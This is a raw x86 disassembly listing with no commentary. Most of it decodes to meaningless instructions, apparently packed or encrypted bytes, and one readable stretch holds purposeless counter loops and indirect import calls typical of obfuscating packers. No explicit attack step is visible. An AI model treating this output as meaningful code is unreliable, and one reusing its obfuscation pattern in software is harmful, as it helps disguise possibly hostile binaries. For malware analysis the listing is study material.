  40a928:	mov    ebx,0x165588d3
  40a92d:	mov    ch,BYTE PTR [esi]
  40a92f:	pop    edx
  40a930:	pop    edx
  40a931:	enter  0x4245,0x8a
  40a935:	mov    eax,ds:0xe74edddf
  40a93a:	cld    
  40a93b:	shl    BYTE PTR [esi-0x59c0c0a],cl
  40a941:	sub    edx,DWORD PTR [edi]
  40a943:	mov    al,0x7
  40a945:	test   edi,eax
  40a947:	dec    esp
  40a948:	pop    ebp
  40a949:	sbb    ah,BYTE PTR [ebp+0x64]
  40a94c:	dec    eax
  40a94d:	push   esp
  40a94e:	pop    eax
  40a94f:	ror    DWORD PTR [eax],1
  40a951:	jp     0x40a95d
  40a953:	adc    bh,dh
  40a955:	jmp    0x53dde7ef
  40a95a:	or     DWORD PTR [ebp-0x30],ebx
  40a95d:	sti    
  40a95e:	or     al,0x86
  40a960:	mov    cl,0x4f
  40a962:	mov    al,0xbf
  40a964:	pop    ebp
  40a965:	repz fwait
  40a967:	push   esi
  40a968:	(bad)  
  40a969:	adc    ebx,DWORD PTR [edx-0x38]
  40a96c:	cld    
  40a96d:	jbe    0x40a93b
  40a96f:	jnp    0x40a97d
  40a971:	push   ecx
  40a972:	sahf   
  40a973:	into   
  40a974:	js     0x40a94b
  40a976:	js     0x40a99b
  40a978:	std    
  40a979:	xor    dh,BYTE PTR [eax-0x418a000f]
  40a97f:	ja     0x40a910
  40a981:	inc    esi
  40a982:	adc    BYTE PTR [ecx+0x5a0e491],0xf
  40a989:	mov    ?,WORD PTR [esi+ebx*2+0x7541b3ba]
  40a990:	stos   DWORD PTR es:[edi],eax
  40a991:	inc    esi
  40a992:	push   esi
  40a993:	retw   
  40a995:	adc    cl,BYTE PTR [eax]
  40a997:	pop    ecx
  40a998:	out    dx,al
  40a999:	adc    edx,DWORD PTR [ebp+ecx*4-0x4a]
  40a99d:	jbe    0x40a956
  40a99f:	popf   
  40a9a0:	jmp    0x40a949
  40a9a2:	jae    0x40a947
  40a9a4:	jns    0x40a9ba
  40a9a6:	imul   ecx,DWORD PTR [ebp+0x4c],0xa25895c2
  40a9ad:	cmp    edi,DWORD PTR [eax+0x1e11fcf4]
  40a9b3:	xchg   edi,eax
  40a9b4:	(bad)  
  40a9b5:	push   edi
  40a9b6:	in     al,dx
  40a9b7:	sub    al,BYTE PTR [esi]
  40a9b9:	mov    WORD PTR [esi],?
  40a9bb:	pop    edi
  40a9bc:	and    ebp,DWORD PTR [edx-0x4480c09d]
  40a9c2:	not    DWORD PTR [ecx+0x51]
  40a9c5:	pop    edx
  40a9c6:	sbb    DWORD PTR [edx+0x4fddffff],0xfffffffe
  40a9cd:	ins    DWORD PTR es:[edi],dx
  40a9ce:	cld    
  40a9cf:	xchg   edi,eax
  40a9d0:	bound  eax,QWORD PTR [ebp+esi*1+0x10]
  40a9d4:	nop
  40a9d5:	cld    
  40a9d6:	sub    BYTE PTR [edi+0x2bca5d46],bl
  40a9dc:	mov    ah,BYTE PTR [ebp+0xf]
  40a9df:	inc    esi
  40a9e0:	daa    
  40a9e1:	(bad)  
  40a9e2:	mov    ecx,0x5af11f2b
  40a9e7:	sbb    BYTE PTR [ebx*2-0x12ff00aa],0xc
  40a9ef:	xor    bl,BYTE PTR [esi+0x6b]
  40a9f2:	jns    0x40aa71
  40a9f4:	push   cs
  40a9f5:	inc    ebp
  40a9f6:	(bad)  
  40a9f7:	xlat   BYTE PTR ds:[ebx]
  40a9f8:	push   es
  40a9f9:	mov    edi,0x9f709f9a
  40a9fe:	pop    ebx
  40a9ff:	in     al,0x14
  40aa01:	cld    
  40aa02:	adc    al,BYTE PTR [ebp-0xa]
  40aa05:	aam    0x8d
  40aa07:	ror    DWORD PTR [eax-0x4549b4ab],1
  40aa0d:	sub    BYTE PTR [ebx],bl
  40aa0f:	xor    DWORD PTR [eax+0x39],esp
  40aa12:	cmp    eax,0x9c6f661a
  40aa17:	jb     0x40a9da
  40aa19:	mov    eax,ds:0xe3d06508
  40aa1e:	or     ch,cl
  40aa20:	mov    esp,0xf646744e
  40aa25:	jmp    0x40a9c3
  40aa27:	(bad)  
  40aa28:	xchg   esp,eax
  40aa29:	jns    0x40aa83
  40aa2b:	add    BYTE PTR [edi+0x4a],bh
  40aa2e:	popf   
  40aa2f:	addr16 add al,0x87
  40aa32:	shl    DWORD PTR [ebp-0x2281a49],0xda
  40aa39:	mov    ecx,0x13badb08
  40aa3e:	add    edx,DWORD PTR [edx]
  40aa40:	and    DWORD PTR [eax+ebp*2+0x7e36189e],eax
  40aa47:	jg     0x40a9d9
  40aa49:	jp     0x40a9fc
  40aa4b:	mov    esi,0x6829718
  40aa50:	sub    eax,0x93a2a61
  40aa55:	dec    edi
  40aa56:	in     eax,0x47
  40aa58:	add    eax,0xf6e69277
  40aa5d:	jmp    0xa83060b7
  40aa62:	push   ebx
  40aa63:	cmp    esi,edx
  40aa65:	aad    0xde
  40aa67:	add    eax,0x61c46083
  40aa6c:	jg     0x40aa1f
  40aa6e:	shl    BYTE PTR [edi],1
  40aa70:	cli    
  40aa71:	mov    eax,ds:0x68ccf261
  40aa76:	mov    bh,0x3f
  40aa78:	cld    
  40aa79:	xor    dl,BYTE PTR [edi]
  40aa7b:	enter  0xcd0a,0x58
  40aa7f:	leave  
  40aa80:	push   ds
  40aa81:	xchg   ecx,eax
  40aa82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa83:	xchg   ecx,eax
  40aa84:	pop    es
  40aa85:	or     eax,0xc1b79ef6
  40aa8a:	push   esp
  40aa8b:	(bad)  
  40aa8c:	xlat   BYTE PTR ds:[ebx]
  40aa8d:	test   ecx,0x793d8ed8
  40aa93:	sahf   
  40aa94:	aad    0x55
  40aa96:	rcr    DWORD PTR [esi+0xff2d39],1
  40aa9c:	jmp    0x332b:0x44b0a5cb
  40aaa3:	cmc    
  40aaa4:	xor    edi,ecx
  40aaa6:	mov    dh,0xf3
  40aaa8:	jecxz  0x40aa66
  40aaaa:	nop
  40aaab:	jle    0x40ab02
  40aaad:	adc    dl,al
  40aaaf:	iret   
  40aab0:	push   ss
  40aab1:	add    esi,DWORD PTR [edi+0x6b79f20f]
  40aab7:	pop    ebp
  40aab8:	in     al,0x7b
  40aaba:	loope  0x40ab11
  40aabc:	stos   DWORD PTR es:[edi],eax
  40aabd:	aam    0xea
  40aabf:	adc    DWORD PTR [ebp+0x4859eb12],ebx
  40aac5:	loope  0x40aab1
  40aac7:	mov    cl,0x0
  40aac9:	mov    edx,0x8da89011
  40aace:	or     DWORD PTR [esi+0x4a],eax
  40aad1:	pop    es
  40aad2:	dec    DWORD PTR [eax-0x2cbf47c1]
  40aad8:	cmp    ah,cl
  40aada:	lds    edi,FWORD PTR [eax-0x53]
  40aadd:	mov    edx,0x1801f981
  40aae2:	mov    ds:0xf06d5704,al
  40aae7:	lods   eax,DWORD PTR ds:[esi]
  40aae8:	pop    ds
  40aae9:	dec    esi
  40aaea:	xor    al,0x83
  40aaec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaed:	mov    ebp,0x263a84d2
  40aaf2:	dec    edx
  40aaf3:	push   ebp
  40aaf4:	cmp    DWORD PTR [esi+0x512faf6],ecx
  40aafa:	cld    
  40aafb:	loope  0x40aa7f
  40aafd:	stos   BYTE PTR es:[edi],al
  40aafe:	sbb    BYTE PTR [ebx],0xa9
  40ab01:	call   0x8983:0x50ca438c
  40ab08:	cmc    
  40ab09:	adc    al,0xea
  40ab0b:	outs   dx,BYTE PTR ds:[esi]
  40ab0c:	mov    cl,0x68
  40ab0e:	jns    0x40ab6e
  40ab10:	pushf  
  40ab11:	cmp    dh,cl
  40ab13:	add    DWORD PTR [esi+ebx*8],esi
  40ab16:	(bad)  
  40ab17:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab19:	aam    0xb1
  40ab1b:	loop   0x40ab45
  40ab1d:	adc    al,0xcd
  40ab1f:	cwde   
  40ab20:	jno    0x40aaef
  40ab22:	dec    ebx
  40ab23:	imul   edi,DWORD PTR [ebx-0x6a527d2c],0xd775a62c
  40ab2d:	(bad)  
  40ab2e:	sbb    eax,0xbb7d6712
  40ab33:	xchg   esp,eax
  40ab34:	in     al,0x93
  40ab36:	lea    esi,[edi+ebp*4+0x7f9987cc]
  40ab3d:	(bad)  [edx]
  40ab3f:	and    DWORD PTR [esi],ecx
  40ab41:	xchg   esi,eax
  40ab42:	mov    al,0x44
  40ab44:	jo     0x40abbb
  40ab46:	or     DWORD PTR [edx+0x7f],0x8775148f
  40ab4d:	inc    ecx
  40ab4e:	mov    al,cl
  40ab50:	test   al,0x91
  40ab52:	ret    0x6ad6
  40ab55:	and    al,0xeb
  40ab57:	xchg   DWORD PTR [edi],ecx
  40ab59:	push   ss
  40ab5a:	out    0x6c,eax
  40ab5c:	cld    
  40ab5d:	scas   al,BYTE PTR es:[edi]
  40ab5e:	dec    edi
  40ab5f:	adc    al,0xac
  40ab61:	xor    al,ah
  40ab63:	mov    edx,0xe33a41f1
  40ab68:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab6a:	jl     0x40ab8c
  40ab6c:	arpl   WORD PTR [ebp-0x7e],si
  40ab6f:	repz aas 
  40ab71:	cli    
  40ab72:	(bad)  [eax+0x4082e2c7]
  40ab78:	aas    
  40ab79:	je     0x40ab2e
  40ab7b:	or     dh,BYTE PTR [ecx]
  40ab7d:	add    al,0xa2
  40ab7f:	inc    edi
  40ab80:	xor    ebp,DWORD PTR [esi]
  40ab82:	scas   al,BYTE PTR es:[edi]
  40ab83:	add    DWORD PTR [edx-0x1660a402],esp
  40ab89:	fdiv   st,st(2)
  40ab8b:	(bad)  
  40ab8c:	idiv   DWORD PTR [ebx]
  40ab8e:	inc    ebp
  40ab8f:	je     0x40ab42
  40ab91:	bswap  ecx
  40ab93:	test   al,0xab
  40ab95:	jl     0x40ab9b
  40ab97:	sar    DWORD PTR [ebp-0x5f],cl
  40ab9a:	cwde   
  40ab9b:	push   esi
  40ab9c:	out    dx,al
  40ab9d:	(bad)  
  40ab9e:	stc    
  40ab9f:	rcr    BYTE PTR [edx],0xb4
  40aba2:	xor    al,0x47
  40aba4:	xor    eax,0xbb3b2a75
  40aba9:	je     0x40ab8e
  40abab:	mov    edi,0x3e7821cd
  40abb0:	gs in  eax,dx
  40abb2:	retf   0xa6c7
  40abb5:	inc    ebp
  40abb6:	ins    DWORD PTR es:[edi],dx
  40abb7:	je     0x40abf7
  40abb9:	loopne 0x40abdd
  40abbb:	pusha  
  40abbc:	ret    0xd8e9
  40abbf:	inc    eax
  40abc0:	sbb    al,0x5b
  40abc2:	nop
  40abc3:	pop    esi
  40abc4:	(bad)  
  40abc5:	push   eax
  40abc6:	sub    eax,0x203dc937
  40abcb:	mov    al,0x9f
  40abcd:	test   BYTE PTR [esi],al
  40abcf:	sub    al,0xc4
  40abd1:	mov    dh,0x76
  40abd3:	cmp    eax,0x847a3d08
  40abd8:	pushf  
  40abd9:	jno    0x40abe4
  40abdb:	scas   eax,DWORD PTR es:[edi]
  40abdc:	int3   
  40abdd:	xor    eax,0x2704cc5c
  40abe2:	xchg   ebx,eax
  40abe3:	mov    edi,esi
  40abe5:	fdiv   QWORD PTR [ebx]
  40abe7:	adc    ah,ch
  40abe9:	jl     0x40abe1
  40abeb:	cs xchg esi,eax
  40abed:	xor    al,0x61
  40abef:	dec    edx
  40abf0:	fmul   st(5),st
  40abf2:	mov    ecx,0x78062d62
  40abf7:	dec    esi
  40abf8:	jecxz  0x40ab89
  40abfa:	jbe    0x40ac61
  40abfc:	cmp    eax,0x33556a26
  40ac01:	rol    BYTE PTR [ecx+0x42fcf535],1
  40ac07:	add    BYTE PTR [edi],cl
  40ac09:	out    0x42,eax
  40ac0b:	add    BYTE PTR [ebx],al
  40ac0d:	rol    edi,1
  40ac0f:	add    eax,0x42e703
  40ac14:	fwait
  40ac15:	sbb    BYTE PTR [eax],al
  40ac17:	add    BYTE PTR [ebx],bh
  40ac19:	cli    
  40ac1a:	mov    DWORD PTR ds:0x42fcdd,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fd7e,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fcf5,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e6f7,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e6f7,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e23d
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e2f3
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e6f7
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e6f7,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e128,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e128
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e128,ebx
  40acad:	cmp    DWORD PTR ds:0x42e128,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e128,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e2f7
  40acd5:	cmp    DWORD PTR ds:0x42e128,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e128
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e128,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e134
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fce1,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fce1,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fce1,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd01
  40ad3c:	call   DWORD PTR ds:0x42e54b
  40ad42:	mov    ebx,DWORD PTR ds:0x42fce1
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fce1,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40adbc
  40adb4:	sahf   
  40adb5:	adc    ch,al
  40adb7:	add    edi,ebp
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40adbe
  40adc0:	outs   dx,DWORD PTR ds:[esi]
  40adc1:	clc    
  40adc2:	lods   eax,DWORD PTR ds:[esi]
  40adc3:	test   BYTE PTR [ecx+0x4a],ch
  40adc6:	bnd jle 0x40ad79
  40adc9:	add    ecx,edi
  40adcb:	or     eax,0x65ae7869
  40add0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40add2:	sbb    al,0xaf
  40add4:	aam    0xe6
  40add6:	rol    BYTE PTR [edi+0x25],1
  40add9:	sbb    bh,BYTE PTR [edx+0x65]
  40addc:	mov    edi,0x24e5f59b
  40ade1:	jmp    0x40ae56
  40ade3:	or     bl,dl
  40ade5:	sbb    DWORD PTR [edx+eiz*2+0x59],edx
  40ade9:	pop    edi
  40adea:	dec    esi
  40adeb:	mov    ds:0x680c98d0,al
  40adf0:	(bad)
  40adf3:	ss mov ebp,0xac4dc161
  40adf9:	adc    BYTE PTR [eax+0x35],0x2c
  40adfd:	hlt    
  40adfe:	sbb    DWORD PTR [ebx-0x6a935362],esp
  40ae04:	lock mov ds:0xc64159ae,al
  40ae0a:	(bad)  
  40ae0b:	cmp    esp,eax
  40ae0d:	sub    DWORD PTR [eax+esi*4+0x6b],edx
  40ae11:	(bad)  
  40ae12:	jmp    FWORD PTR [ebp-0x19664c81]
  40ae18:	mov    ch,0xa5
  40ae1a:	rcr    BYTE PTR [esi],0x7f
  40ae1d:	sub    bh,0xdb
  40ae20:	in     eax,dx
  40ae21:	stos   BYTE PTR es:[edi],al
  40ae22:	out    0x3e,eax
  40ae24:	xchg   edi,eax
  40ae25:	ins    BYTE PTR es:[edi],dx
  40ae26:	hlt    
  40ae27:	jp     0x40ae17
  40ae29:	dec    edx
  40ae2a:	outs   dx,DWORD PTR ds:[esi]
  40ae2b:	test   eax,0x1a7eacad
  40ae30:	outs   dx,DWORD PTR ds:[esi]
  40ae31:	mov    al,0x39
  40ae33:	or     dh,BYTE PTR [ebx+ebx*8]
  40ae36:	cmp    BYTE PTR [ebx],ah
  40ae38:	imul   edx,DWORD PTR [esi+edx*2-0x1706f3a4],0xbdb7671a
  40ae43:	or     ebx,ebx
  40ae45:	lods   al,BYTE PTR ds:[esi]
  40ae46:	out    dx,al
  40ae47:	jg     0x40adf5
  40ae49:	add    cl,bl
  40ae4b:	mov    esp,0xcc63fd6e
  40ae50:	and    ebx,DWORD PTR [ebp+0x4]
  40ae53:	jae    0x2a84da2b
  40ae59:	enter  0x2cf,0xf1
  40ae5d:	sub    ecx,eax
  40ae5f:	stos   DWORD PTR es:[edi],eax
  40ae60:	fcomp  DWORD PTR [esi+0x76]
  40ae63:	jle    0x40aee1
  40ae65:	ds jecxz 0x40ae5a
  40ae68:	(bad)  
  40ae69:	lds    edx,FWORD PTR [ebp+0x75721665]
  40ae6f:	std    
  40ae70:	fs dec ebp
  40ae72:	xor    eax,0x9cc37dc7
  40ae77:	leave  
  40ae78:	fild   DWORD PTR [ecx+0x59c0f9ae]
  40ae7e:	je     0x14a2471
  40ae84:	popf   
  40ae85:	sub    al,0x33
  40ae87:	fiadd  WORD PTR [edx+0x3f]
  40ae8a:	repz add dh,BYTE PTR [eax-0x33dfc25b]
  40ae91:	dec    ebp
  40ae92:	jbe    0x40ae5f
  40ae94:	iret   
  40ae95:	in     al,dx
  40ae96:	xchg   ecx,eax
  40ae97:	jmp    0xf23df374
  40ae9c:	mov    bl,0x2
  40ae9e:	in     eax,0x69
  40aea0:	xchg   ebp,eax
  40aea1:	adc    ebp,DWORD PTR [edi-0x50c76ec5]
  40aea7:	pop    edi
  40aea8:	sahf   
  40aea9:	jae    0x40aed3
  40aeab:	imul   eax,DWORD PTR [eax],0x3
  40aeae:	cmp    BYTE PTR [eax+ecx*4-0x503ea5b9],dh
  40aeb5:	add    dl,BYTE PTR [ecx+0x5b6dcbd1]
  40aebb:	int    0xce
  40aebd:	sbb    ebp,0xb
  40aec0:	push   0xffffffcc
  40aec2:	(bad)  
  40aec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aec4:	cmp    edi,DWORD PTR [edx+0x3a0923f2]
  40aeca:	mov    bh,0xf5
  40aecc:	dec    edx
  40aecd:	or     ecx,DWORD PTR [eax-0x5e0cf28a]
  40aed3:	test   DWORD PTR [edx+ebx*1],esi
  40aed6:	retf   
  40aed7:	aam    0xb7
  40aed9:	and    eax,esi
  40aedb:	dec    ecx
  40aedc:	mov    ch,0xf7
  40aede:	mov    ecx,0xf0f68e08
  40aee3:	ficom  WORD PTR [ebx]
  40aee5:	mov    WORD PTR [edi+0x51],cs
  40aee8:	dec    eax
  40aee9:	or     al,0xa3
  40aeeb:	adc    ch,BYTE PTR [edx+0x4e]
  40aeee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aeef:	(bad)  
  40aef1:	dec    esi
  40aef2:	push   ss
  40aef3:	ja     0x40aea4
  40aef5:	mov    cs,eax
  40aef7:	(bad)  
  40aef8:	mov    edx,0xd7ae0a9c
  40aefd:	jp     0x40af5d
  40aeff:	push   ecx
  40af00:	je     0x40af36
  40af02:	mov    dl,0xda
  40af04:	repnz out 0x53,al
  40af07:	leave  
  40af08:	mov    esp,es
  40af0a:	sbb    ebx,DWORD PTR [ebx]
  40af0c:	(bad)  
  40af0d:	nop
  40af0e:	jp     0x40ae98
  40af10:	into   
  40af11:	add    ecx,DWORD PTR [esi-0x6bfe2975]
  40af17:	dec    ebx
  40af18:	dec    ebx
  40af19:	clc    
  40af1a:	xlat   BYTE PTR ds:[ebx]
  40af1b:	(bad)  
  40af1c:	loope  0x40aed9
  40af1e:	jb     0x40af1d
  40af20:	lea    eax,ds:0x373a4e07
  40af26:	loope  0x40af88
  40af28:	(bad)  
  40af29:	mov    BYTE PTR [ebp-0x34463579],bl
  40af2f:	push   ds
  40af30:	ds pop esp
  40af32:	and    BYTE PTR [ebx],0x62
  40af35:	mov    al,0x93
  40af37:	ds ins DWORD PTR es:[edi],dx
  40af39:	xor    DWORD PTR [edi+0x28e2052e],esi
  40af3f:	xor    al,0xe9
  40af41:	mov    BYTE PTR [eax-0x27],bh
  40af44:	sub    eax,edi
  40af46:	pop    ecx
  40af47:	jmp    0x40aecc
  40af49:	mov    ebp,DWORD PTR [edx-0x2f25c8f]
  40af4f:	push   0x6b
  40af51:	mov    ebx,0x8d3adee8
  40af56:	add    bl,0x1c
  40af59:	out    dx,eax
  40af5a:	mov    bl,0x99
  40af5c:	lahf   
  40af5d:	ret    
  40af5e:	sub    al,0xb6
  40af60:	pop    esi
  40af61:	cmp    edi,esp
  40af63:	add    DWORD PTR [eax+ecx*4-0x9d0a95f],0x55
  40af6b:	rcr    esp,cl
  40af6d:	ret    
  40af6e:	fcmovne st,st(4)
  40af70:	out    0xe,al
  40af72:	sbb    BYTE PTR [edx],dl
  40af74:	xlat   BYTE PTR ds:[ebx]
  40af75:	aad    0xd6
  40af77:	xchg   DWORD PTR [edi-0x14332c6b],esp
  40af7d:	in     eax,0xb2
  40af7f:	retf   0x9167
  40af82:	mov    eax,0xa28c8795
  40af87:	aas    
  40af88:	push   eax
  40af89:	(bad)
  40af8d:	adc    esi,ebp
  40af8f:	cmp    dl,BYTE PTR [ecx+0x54d59142]
  40af95:	shl    DWORD PTR [ebx*2+0x54cd324e],0x36
  40af9d:	test   BYTE PTR ds:0x16744fe9,bl
  40afa3:	out    dx,eax
  40afa4:	out    0x81,al
  40afa6:	in     al,dx
  40afa7:	pop    ds
  40afa8:	dec    esi
  40afa9:	pushf  
  40afaa:	mov    esi,0x1d48bc00
  40afaf:	fwait
  40afb0:	mov    edx,gs
  40afb2:	cmp    DWORD PTR [ebx+0x3c],edx
  40afb5:	inc    edi
  40afb6:	(bad)  
  40afb7:	fnstcw WORD PTR [edi]
  40afb9:	fdiv   QWORD PTR [ecx+ecx*4]
  40afbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afbd:	push   ebp
  40afbe:	cmp    DWORD PTR [edi+0x7cdffd2a],eax
  40afc4:	xchg   ebp,eax
  40afc5:	sub    edi,ebp
  40afc7:	call   0x26a52e3b
  40afcc:	jnp    0x40b017
  40afce:	scas   al,BYTE PTR es:[edi]
  40afcf:	mov    eax,0x7d860c7f
  40afd4:	hlt    
  40afd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afd6:	test   al,0x55
  40afd8:	jge    0x40afae
  40afda:	lock or al,0xc1
  40afdd:	or     eax,0xb248142b
  40afe2:	xlat   BYTE PTR ds:[ebx]
  40afe3:	jecxz  0x40b035
  40afe5:	leave  
  40afe6:	push   ebp
  40afe7:	inc    esi
  40afe8:	cmc    
  40afe9:	xchg   edi,eax
  40afea:	repz adc ebx,DWORD PTR [ecx+0x4b2a4fdd]
  40aff1:	xchg   ebx,eax
  40aff2:	lods   al,BYTE PTR ds:[esi]
  40aff3:	(bad)  
  40aff4:	cmp    al,0xb8
  40aff6:	lods   al,BYTE PTR ds:[esi]
  40aff7:	adc    al,0x9c
  40aff9:	in     al,0x42
  40affb:	push   edx
  40affc:	ret    0x8836
  40afff:	nop
  40b000:	shl    edx,cl
  40b002:	call   0x82c5940d
  40b007:	std    
  40b008:	shr    DWORD PTR gs:[edi],0x4b
  40b00c:	out    dx,al
  40b00d:	pusha  
  40b00e:	xor    ebx,0xffffff91
  40b011:	inc    esp
  40b012:	sub    DWORD PTR [edx-0x7f888efe],ebp
  40b018:	pushf  
  40b019:	sbb    BYTE PTR ds:[ecx+0x34d1e139],cl
  40b020:	popf   
  40b021:	mov    dh,0xf9
  40b023:	fwait
  40b024:	pop    ecx
  40b025:	les    esp,FWORD PTR ds:0x968f1555
  40b02b:	mov    al,ds:0x354a92e
  40b030:	iret   
  40b031:	mov    dh,0x8f
  40b033:	add    DWORD PTR [edx],eax
  40b035:	jl     0x40b0b2
  40b037:	retf   
  40b038:	int3   
  40b039:	loop   0x40b083
  40b03b:	xor    al,0x83
  40b03d:	mov    BYTE PTR ds:0xa23facc7,ch
  40b043:	add    BYTE PTR ds:[ecx+0x74],bh
  40b047:	rcr    BYTE PTR [ecx+edx*2+0x17a2b59],0x92
  40b04f:	jno    0x40afe5
  40b051:	add    edx,DWORD PTR [ebx]
  40b053:	pop    esi
  40b054:	cmp    al,0x86
  40b056:	mov    cl,0x35
  40b058:	adc    DWORD PTR [eax],edi
  40b05a:	or     eax,0x5b601d87
  40b05f:	add    al,0xf1
  40b061:	or     DWORD PTR [ebx+0x45],ebx
  40b064:	stc    
  40b065:	popa   
  40b066:	out    0x42,al
  40b068:	and    edx,DWORD PTR [ebx-0xb]
  40b06b:	pop    ebp
  40b06c:	push   esp
  40b06d:	test   BYTE PTR [edi-0x8acdec9],ah
  40b073:	stos   DWORD PTR es:[edi],eax
  40b074:	mov    al,0x1b
  40b076:	xchg   esp,eax
  40b077:	mov    edi,esi
  40b079:	(bad)  
  40b07a:	pop    ebx
  40b07b:	sahf   
  40b07c:	scas   eax,DWORD PTR es:[edi]
  40b07d:	mov    dh,0xf6
  40b07f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b080:	push   edx
  40b081:	ret    0x7e65
  40b084:	lods   eax,DWORD PTR ds:[esi]
  40b085:	cmp    DWORD PTR [ecx],0x8
  40b088:	xor    ebp,DWORD PTR [edx+edx*8]
  40b08b:	jo     0x40b04f
  40b08d:	cli    
  40b08e:	enter  0x8f2,0x54
  40b092:	je     0x40b109
  40b094:	push   ecx
  40b095:	mov    eax,ds:0xe72a6241
  40b09a:	fimul  DWORD PTR [esi+0x47]
  40b09d:	lahf   
  40b09e:	or     BYTE PTR [eax],ch
  40b0a0:	popa   
  40b0a1:	inc    ebp
  40b0a2:	dec    edx
  40b0a3:	es inc edi
  40b0a5:	add    cl,BYTE PTR [ecx-0x5b9cd274]
  40b0ab:	add    eax,0x2b6cfc7a
  40b0b0:	shl    BYTE PTR [eax],1
  40b0b2:	push   ecx
  40b0b3:	mov    WORD PTR [eax+0x27acd1cb],?
  40b0b9:	inc    ecx
  40b0ba:	xchg   esp,eax
  40b0bb:	lea    eax,[esi+0x19]
  40b0be:	fsubr  QWORD PTR [ecx]
  40b0c0:	stos   BYTE PTR es:[edi],al
  40b0c1:	cmc    
  40b0c2:	lahf   
  40b0c3:	jnp    0x40b0d5
  40b0c5:	bound  edx,QWORD PTR [ebx+0x2b005bb2]
  40b0cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0cc:	jp     0x40b0cf
  40b0ce:	and    eax,0x9fa79ce0
  40b0d3:	rol    BYTE PTR [esi+0x7a],1
  40b0d6:	in     eax,dx
  40b0d7:	data16 loop 0x40b151
  40b0da:	pop    edi
  40b0db:	push   esp
  40b0dc:	dec    edi
  40b0dd:	sahf   
  40b0de:	pop    esi
  40b0df:	push   eax
  40b0e0:	pop    ss
  40b0e1:	outs   dx,BYTE PTR ds:[esi]
  40b0e2:	test   BYTE PTR [eax],bl
  40b0e4:	leave  
  40b0e5:	xchg   esp,ecx
  40b0e7:	mov    esi,DWORD PTR [edi+0xf]
  40b0ea:	jl     0x40b09c
  40b0ec:	sub    ah,BYTE PTR [ecx-0x62]
